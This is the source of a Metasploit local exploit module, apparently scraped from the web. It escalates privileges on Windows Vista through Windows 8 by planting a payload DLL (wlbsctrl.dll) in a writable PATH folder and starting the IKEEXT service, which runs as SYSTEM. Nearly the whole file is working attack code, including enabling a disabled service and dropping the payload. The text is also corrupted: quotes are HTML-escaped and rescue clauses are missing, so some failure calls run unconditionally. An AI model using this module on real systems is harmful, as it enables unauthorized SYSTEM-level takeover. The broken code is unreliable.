# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/windows/services&#039;
require &#039;msf/core/post/windows/priv&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Accounts

  def initialize(info={})
    super( update_info( info,
      &#039;Name&#039;     => &#039;IKE and AuthIP IPsec Keyring Modules Service (IKEEXT) Missing DLL&#039;,
      &#039;Description&#039;   => %q{
        This module exploits a missing DLL loaded by the &#039;IKE and AuthIP Keyring Modules&#039;
        (IKEEXT) service which runs as SYSTEM, and starts automatically in default
        installations of Vista-Win8.
        It requires an insecure bin path to plant the DLL payload.
      },
      &#039;References&#039;   =>
        [
          [&#039;URL&#039;, &#039;https://www.htbridge.com/advisory/HTB23108&#039;],
          [&#039;URL&#039;, &#039;https://www.htbridge.com/vulnerability/uncontrolled-search-path-element.html&#039;]
        ],
      &#039;DisclosureDate&#039; => "Oct 09 2012",
      &#039;License&#039;   => MSF_LICENSE,
      &#039;Author&#039;   =>
        [
          &#039;Ben Campbell <eat_meatballs@hotmail.co.uk>&#039;
        ],
      &#039;Platform&#039;   => [ &#039;win&#039;],
      &#039;Targets&#039;   =>
        [
          [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
          &#039;WfsDelay&#039; => 5,
          &#039;ReverseConnectRetries&#039; => 255
        },
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options([
      OptString.new("DIR", [ false, "Specify a directory to plant the DLL.", ""])
    ])
    @service_name = &#039;IKEEXT&#039;
    @load_lib_search_path = [  &#039;%SystemRoot%\\System32&#039;,
            &#039;%SystemRoot%\\System&#039;,
            &#039;%SystemRoot%&#039;
          ]
    @non_existant_dirs = []
  end

  def check_service_exists?(service)
    srv_info = service_info(service)

    if srv_info.nil?
      print_warning("Unable to enumerate services.")
      return false
    end

    if srv_info && srv_info[&#039;Name&#039;].empty?
      print_warning("Service #{service} does not exist.")
      return false
    else
      return true
    end
  end

  def check
    srv_info = service_info(@service_name)

    if !check_service_exists?(@service_name)
      return Exploit::CheckCode::Safe
    end

    vprint_status(srv_info.to_s)

    case srv_info[&#039;Startup&#039;]
    when &#039;Disabled&#039;
      print_error("Service startup is Disabled, so will be unable to exploit unless account has correct permissions...")
      return Exploit::CheckCode::Safe
    when &#039;Manual&#039;
      print_error("Service startup is Manual, so will be unable to exploit unless account has correct permissions...")
      return Exploit::CheckCode::Safe
    when &#039;Auto&#039;
      print_good("Service is set to Automatically start...")
    end

    if check_search_path
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Vulnerable
  end

  def check_search_path
    dll = &#039;wlbsctrl.dll&#039;

    @load_lib_search_path.each do |path|
      dll_path = "#{expand_path(path)}\\#{dll}"

      if file_exist?(dll_path)
        print_warning("DLL already exists at #{dll_path}...")
        return true
      end
    end

    return false
  end

  def check_system_path
    print_status("Checking %PATH% folders for write access...")
    result  = registry_getvaldata(&#039;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&#039;, &#039;Path&#039;)

    if result.nil?
      print_error("Unable to retrieve %PATH% from registry.")
      return
    end

    paths = result.split(&#039;;&#039;)
    paths.append(@load_lib_search_path).flatten!.uniq!

    paths.each do |p|
      path = expand_path(p)
      if exist?(path)
        if check_write_access(path)
          return path
        end
      else
        # User may be able to create the path...
        print_status("Path #{path} does not exist...")
        @non_existant_dirs << path
      end
    end

    return nil
  end

  def check_write_access(path)
    perm = check_dir_perms(path, @token)
    if perm and perm.include?(&#039;W&#039;)
      print_good ("Write permissions in #{path} - #{perm}")
      return true
    elsif perm
      vprint_status ("Permissions for #{path} - #{perm}")
    else
      vprint_status ("No permissions for #{path}")
    end

    return false
  end

  def check_dirs
    print_status("Attempting to create a non-existant PATH dir to use.")
    @non_existant_dirs.each do |dir|
      begin
        client.fs.dir.mkdir(dir)
        if exist?(dir)
          register_file_for_cleanup(dir)
          return dir
        end
        vprint_status("Unable to create dir: #{dir} - #{e}")
      end
    end

    return nil
  end

  def check_session_arch
    if sysinfo[&#039;Architecture&#039;] =~ /x64/i
      if payload_instance.arch.first == &#039;x86&#039;
        fail_with(Exploit::Failure::BadConfig, "Wrong Payload Architecture")
      end
    else
      if payload_instance.arch.first =~ /64/i
        fail_with(Exploit::Failure::BadConfig, "Wrong Payload Architecture")
      end
    end
  end

  def exploit
    check_session_arch

    begin
      @token = get_imperstoken
      vprint_error("Error while using get_imperstoken: #{e}")
    end

    fail_with(Exploit::Failure::Unknown, "Unable to retrieve token.") unless @token

    if is_system?
      fail_with(Exploit::Failure::Unknown, "Current user is already SYSTEM, aborting.")
    end

    print_status("Checking service exists...")
    if !check_service_exists?(@service_name)
      fail_with(Exploit::Failure::NoTarget, "The service doesn&#039;t exist.")
    end

    if is_uac_enabled?
      print_warning("UAC is enabled, may get false negatives on writable folders.")
    end

    if datastore[&#039;DIR&#039;].empty?
      # If DLL already exists in system folders, we dont want to overwrite by accident
      if check_search_path
        fail_with(Exploit::Failure::NotVulnerable, "DLL already exists in system folders.")
      end

      file_path = check_system_path
      file_path ||= check_dirs # If no paths are writable check to see if we can create any of the non-existant dirs

      if file_path.nil?
        fail_with(Exploit::Failure::NotVulnerable, "Unable to write to any folders in the PATH, aborting...")
      end
    else
      # Use manually selected Dir
      file_path = datastore[&#039;DIR&#039;]
    end

    @dll_file_path = "#{file_path}\\wlbsctrl.dll"

    service_information = service_info(@service_name)

    if service_information[&#039;Startup&#039;] == &#039;Disabled&#039;
      print_status("Service is disabled, attempting to enable...")
      service_change_startup(@service_name, &#039;auto&#039;)
      service_information = service_info(@service_name)

      # Still disabled
      if service_information[&#039;Startup&#039;] == &#039;Disabled&#039;
        fail_with(Exploit::Failure::NotVulnerable, "Unable to enable service, aborting...")
      end
    end

    # Check architecture
    dll = generate_payload_dll

    #
    # Drop the malicious executable into the path
    #
    print_status("Writing #{dll.length.to_s} bytes to #{@dll_file_path}...")
    begin
      write_file(@dll_file_path, dll)
      register_file_for_cleanup(@dll_file_path)
      # Can&#039;t write the file, can&#039;t go on
      fail_with(Exploit::Failure::Unknown, e.message)
    end

    #
    # Run the service, let the Windows API do the rest
    #
    print_status("Launching service #{@service_name}...")

    begin
      status = service_start(@service_name)
      if status == 1
        print_status("Service already running, attempting to restart...")
        if service_stop(@service_name) == 0
          print_status("Service stopped, attempting to start...")
          if service_start(@service_name) == 0
            print_status("Service started...")
          else
            fail_with(Exploit::Failure::Unknown, "Unable to start service.")
          end
        else
          fail_with(Exploit::Failure::Unknown, "Unable to stop service")
        end
      elsif status == 0
        print_status("Service started...")
      end
    rescue RuntimeError => e
      raise e if e.kind_of? Msf::Exploit::Failed
      if service_information[&#039;Startup&#039;] == &#039;Manual&#039;
        fail_with(Exploit::Failure::Unknown, "Unable to start service, and it does not auto start, cleaning up...")
      else
        if job_id
          print_status("Unable to start service, handler running waiting for a reboot...")
          while(true)
            break if session_created?
            select(nil,nil,nil,1)
          end
        else
          fail_with(Exploit::Failure::Unknown, "Unable to start service, use exploit -j to run as a background job and wait for a reboot...")
        end
      end
    end
  end

end

